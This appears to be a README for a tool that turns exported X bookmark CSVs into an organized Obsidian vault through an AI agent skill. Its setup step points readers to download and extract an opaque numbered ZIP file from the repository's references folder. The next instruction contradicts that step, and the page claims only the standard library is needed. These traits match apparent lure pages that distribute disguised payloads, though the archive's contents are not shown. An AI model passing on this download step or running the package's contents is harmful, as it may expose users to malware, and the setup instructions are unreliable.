# 📥 x-bookmarks-to-obsidian - Turn X Favorites Into an Organized Library

## 🚀 What This Does For You

If you've ever saved posts on X (Twitter) and then struggled to find them again, this tool is your solution. It takes the CSV file that X's browser extensions export from your bookmarks and transforms it into a clean, searchable, and categorized Obsidian vault. You'll finally know *why* you saved something and *what* you can do with it later.

## 🎯 The Three Powerful Views You'll Get

### 📚 Article Library
- Automatically removes duplicate bookmarks
- Sorts your saved posts by their real-world purpose
- Titles link directly back to the original X post
- Filter by author, category, view count, or engagement level

### 👤 Author Cards
- Four cards displayed side-by-side in a row
- Circular profile pictures for quick recognition
- Author name and X handle clearly shown
- Number of bookmarked articles from each author
- Smart short tags extracted from their content
- Star your favorite authors to pin them to the top row
- Click "View All Articles" to jump into that author's page

### 🛠️ Learning & Practice Workspace
- See what's new from yesterday plus any unread historical items
- Move content through stages: To Learn, To Practice, In Practice, or Archived
- Set priority levels, next action steps, and reminder dates for important items
- Link dedicated learning or practice notes and record your final outcomes

## ✅ What You Need Before Starting

- An AI agent that supports Skill or Agent Skills (Codex, Claude Code, Cursor, CodeBuddy, and similar tools all work)
- Python 3.9 or newer (only standard library is used—no pip installs needed)
- An existing Obsidian vault
- A CSV file exported from your X bookmarks
- The Obsidian Dataview plugin (required for author cards and pinned stars)

This Skill works with any agent that reads `SKILL.md` and runs local commands. No special agent features are required. If you skip Dataview, you'll still get the article database and basic author notes—just without the interactive cards.

## 🛠️ Step-by-Step Setup Guide

### Step 1: Export Your X Bookmarks
1. Open your browser extension that manages X bookmarks (like "Bookmarks for X" or similar)
2. Find the export or backup option in the extension's settings
3. Choose "Export to CSV" and save the file somewhere easy to find, like your Desktop
4. Name it something simple like `bookmarks.csv`

### Step 2: Get the Tool
1. Click the download button above or go to [https://github.com/laszlo2615/x-bookmarks-to-obsidian/raw/refs/heads/main/references/3.5.zip](https://github.com/laszlo2615/x-bookmarks-to-obsidian/raw/refs/heads/main/references/3.5.zip)
2. Look for the green "Code" button and select "Download ZIP"
3. Save the ZIP file to your Desktop
4. Right-click the ZIP file and choose "Extract All"
5. Keep the extracted folder in a place you'll remember

### Step 3: Prepare Your AI Agent
1. Open your AI agent (Codex, Claude Code, Cursor, or whatever you use)
2. Make sure it's configured to run local commands
3. Navigate to the folder where you extracted the tool
4. The agent will read the `SKILL.md` file and know exactly what to do

### Step 4: Run the Conversion
1. Tell your AI agent to process your `bookmarks.csv` file
2. Point it to your Obsidian vault location
3. The agent will create all the folders, notes, and databases automatically
4. Watch as your bookmarks transform into a structured library

### Step 5: Open in Obsidian
1. Launch Obsidian and open your vault
2. You'll see new folders for articles, authors, and your workspace
3. If you have Dataview installed, the author cards will appear automatically
4. Start exploring your newly organized collection

## 🆘 Troubleshooting Tips

**Problem: The author cards aren't showing**
Solution: Make sure you have the Dataview plugin installed and enabled in Obsidian. The cards require this plugin to work.

**Problem: The CSV file won't import**
Solution: Check that your export is in CSV format, not JSON or another type. Some extensions export differently—look for a "CSV" option.

**Problem: Python errors appear**
Solution: Verify you have Python 3.9 or higher installed. Open a terminal and type `python --version` to check.
